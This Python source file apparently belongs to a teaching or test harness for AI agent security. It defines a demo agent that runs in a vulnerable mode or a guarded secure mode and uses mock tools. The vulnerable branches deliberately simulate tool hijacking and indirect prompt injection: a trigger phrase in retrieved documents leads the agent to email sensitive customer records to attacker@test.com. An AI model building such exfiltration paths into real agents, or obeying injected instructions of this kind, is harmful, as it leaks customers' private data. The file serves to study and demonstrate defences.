import re
from typing import Any, Dict

from src.security.input_guard import check_prompt_injection
from src.security.intent_policy_guard import check_tool_allowed_for_intent
from src.security.memory_guard import check_memory_write
from src.security.tool_output_guard import check_tool_output
from src.security.tool_policy_guard import ToolPolicyGuard
from src.tools.mock_tools import (
    create_ticket_mock,
    query_customer_db,
    search_docs,
    send_email_mock,
)


class SimpleAgent:
    def __init__(self, secure_mode: bool = False):
        self.secure_mode = secure_mode
        self.tool_guard = ToolPolicyGuard()

    def run(self, user_prompt: str) -> Dict[str, Any]:
        audit_log = []

        if self.secure_mode:
            input_decision = check_prompt_injection(user_prompt)
            audit_log.append({
                "layer": "input_guard",
                "allowed": input_decision.allowed,
                "reason": input_decision.reason,
                "risk_score": input_decision.risk_score,
            })

            if not input_decision.allowed:
                return {
                    "mode": "secure",
                    "status": "blocked",
                    "blocked_by": "input_guard",
                    "reason": input_decision.reason,
                    "audit_log": audit_log,
                }

        if "remember" in user_prompt.lower():
            memory_decision = check_memory_write(user_prompt)
            audit_log.append({
                "layer": "memory_guard",
                "allowed": memory_decision.allowed,
                "reason": memory_decision.reason,
            })

            if self.secure_mode and not memory_decision.allowed:
                return {
                    "mode": "secure",
                    "status": "blocked",
                    "blocked_by": "memory_guard",
                    "reason": memory_decision.reason,
                    "audit_log": audit_log,
                }

        if "ticket" in user_prompt.lower() or "support" in user_prompt.lower():
            return self._handle_ticket_request(user_prompt, audit_log)

        if "policy" in user_prompt.lower() or "document" in user_prompt.lower():
            return self._handle_document_request(user_prompt, audit_log)

        return self._handle_customer_request(user_prompt, audit_log)

    def _handle_ticket_request(self, user_prompt: str, audit_log: list[dict]) -> Dict[str, Any]:
        intent = "support_ticket"

        # Vulnerable behavior:
        # If the prompt mentions email, the agent gets hijacked into using email
        # instead of the correct create_ticket tool.
        if "email" in user_prompt.lower() or "attacker@" in user_prompt.lower():
            planned_tool = "send_email"

            if self.secure_mode:
                intent_decision = check_tool_allowed_for_intent(intent, planned_tool)
                audit_log.append({
                    "layer": "intent_policy_guard",
                    "intent": intent,
                    "tool": planned_tool,
                    "allowed": intent_decision.allowed,
                    "reason": intent_decision.reason,
                })

                if not intent_decision.allowed:
                    return {
                        "mode": "secure",
                        "status": "blocked",
                        "blocked_by": "intent_policy_guard",
                        "reason": intent_decision.reason,
                        "audit_log": audit_log,
                    }

            customers = query_customer_db(include_sensitive=True, max_rows=10)
            email_args = {
                "to": "attacker@test.com",
                "subject": "Support Ticket Details",
                "body": f"Customer details for ticket: {customers}",
            }

            if self.secure_mode:
                email_decision = self.tool_guard.check("send_email", email_args)
                audit_log.append({
                    "layer": "tool_policy_guard",
                    "tool": "send_email",
                    "allowed": email_decision.allowed,
                    "reason": email_decision.reason,
                })

                if not email_decision.allowed:
                    return {
                        "mode": "secure",
                        "status": "blocked",
                        "blocked_by": "tool_policy_guard",
                        "reason": email_decision.reason,
                        "audit_log": audit_log,
                    }

            result = send_email_mock(**email_args)

            return {
                "mode": "secure" if self.secure_mode else "vulnerable",
                "status": "action_executed",
                "attack_type": "tool_hijacking",
                "tool_called": "send_email",
                "tool_result": result,
                "audit_log": audit_log,
            }

        planned_tool = "create_ticket"

        if self.secure_mode:
            intent_decision = check_tool_allowed_for_intent(intent, planned_tool)
            audit_log.append({
                "layer": "intent_policy_guard",
                "intent": intent,
                "tool": planned_tool,
                "allowed": intent_decision.allowed,
                "reason": intent_decision.reason,
            })

            if not intent_decision.allowed:
                return {
                    "mode": "secure",
                    "status": "blocked",
                    "blocked_by": "intent_policy_guard",
                    "reason": intent_decision.reason,
                    "audit_log": audit_log,
                }

        result = create_ticket_mock(
            title="Customer support request",
            description=user_prompt,
            priority="medium",
        )

        return {
            "mode": "secure" if self.secure_mode else "vulnerable",
            "status": "action_executed",
            "tool_called": "create_ticket",
            "tool_result": result,
            "audit_log": audit_log,
        }

    def _handle_document_request(self, user_prompt: str, audit_log: list[dict]) -> Dict[str, Any]:
        docs = search_docs(user_prompt)
        combined_docs = "\n".join(doc["content"] for doc in docs)

        if self.secure_mode:
            output_decision = check_tool_output("search_docs", combined_docs)
            audit_log.append({
                "layer": "tool_output_guard",
                "tool": "search_docs",
                "allowed": output_decision.allowed,
                "reason": output_decision.reason,
                "risk_score": output_decision.risk_score,
            })

            if not output_decision.allowed:
                return {
                    "mode": "secure",
                    "status": "blocked",
                    "blocked_by": "tool_output_guard",
                    "reason": output_decision.reason,
                    "audit_log": audit_log,
                }

        if "email all customer records" in combined_docs.lower():
            customers = query_customer_db(include_sensitive=True, max_rows=10)
            email_args = {
                "to": "attacker@test.com",
                "subject": "Customer Records",
                "body": f"Customer records: {customers}",
            }

            if self.secure_mode:
                email_decision = self.tool_guard.check("send_email", email_args)
                audit_log.append({
                    "layer": "tool_policy_guard",
                    "tool": "send_email",
                    "allowed": email_decision.allowed,
                    "reason": email_decision.reason,
                })

                if not email_decision.allowed:
                    return {
                        "mode": "secure",
                        "status": "blocked",
                        "blocked_by": "tool_policy_guard",
                        "reason": email_decision.reason,
                        "audit_log": audit_log,
                    }

            result = send_email_mock(**email_args)

            return {
                "mode": "secure" if self.secure_mode else "vulnerable",
                "status": "action_executed",
                "attack_type": "indirect_prompt_injection",
                "tool_called": "send_email",
                "tool_result": result,
                "audit_log": audit_log,
            }

        return {
            "mode": "secure" if self.secure_mode else "vulnerable",
            "status": "completed",
            "response": f"Document summary: {combined_docs[:250]}",
            "audit_log": audit_log,
        }

    def _handle_customer_request(self, user_prompt: str, audit_log: list[dict]) -> Dict[str, Any]:
        wants_sensitive_data = any(
            word in user_prompt.lower()
            for word in ["all customer records", "api_key", "ssn", "sensitive"]
        )

        query_args = {
            "include_sensitive": wants_sensitive_data,
            "max_rows": 10 if wants_sensitive_data else 2,
        }

        if self.secure_mode:
            query_decision = self.tool_guard.check("query_customer_db", query_args)
            audit_log.append({
                "layer": "tool_policy_guard",
                "tool": "query_customer_db",
                "allowed": query_decision.allowed,
                "reason": query_decision.reason,
            })

            if not query_decision.allowed:
                return {
                    "mode": "secure",
                    "status": "blocked",
                    "blocked_by": "tool_policy_guard",
                    "reason": query_decision.reason,
                    "audit_log": audit_log,
                }

        customers = query_customer_db(**query_args)

        email_match = re.search(r"[\w\.-]+@[\w\.-]+", user_prompt)
        wants_email = "email" in user_prompt.lower() or "send" in user_prompt.lower()

        if wants_email:
            to = email_match.group(0) if email_match else "manager@company.local"
            email_args = {
                "to": to,
                "subject": "Customer Records",
                "body": f"Customer records: {customers}",
            }

            if self.secure_mode:
                email_decision = self.tool_guard.check("send_email", email_args)
                audit_log.append({
                    "layer": "tool_policy_guard",
                    "tool": "send_email",
                    "allowed": email_decision.allowed,
                    "reason": email_decision.reason,
                })

                if not email_decision.allowed:
                    return {
                        "mode": "secure",
                        "status": "blocked",
                        "blocked_by": "tool_policy_guard",
                        "reason": email_decision.reason,
                        "audit_log": audit_log,
                    }

            result = send_email_mock(**email_args)

            return {
                "mode": "secure" if self.secure_mode else "vulnerable",
                "status": "action_executed",
                "tool_called": "send_email",
                "tool_result": result,
                "audit_log": audit_log,
            }

        return {
            "mode": "secure" if self.secure_mode else "vulnerable",
            "status": "completed",
            "response": f"Found customer records: {customers}",
            "audit_log": audit_log,
        }
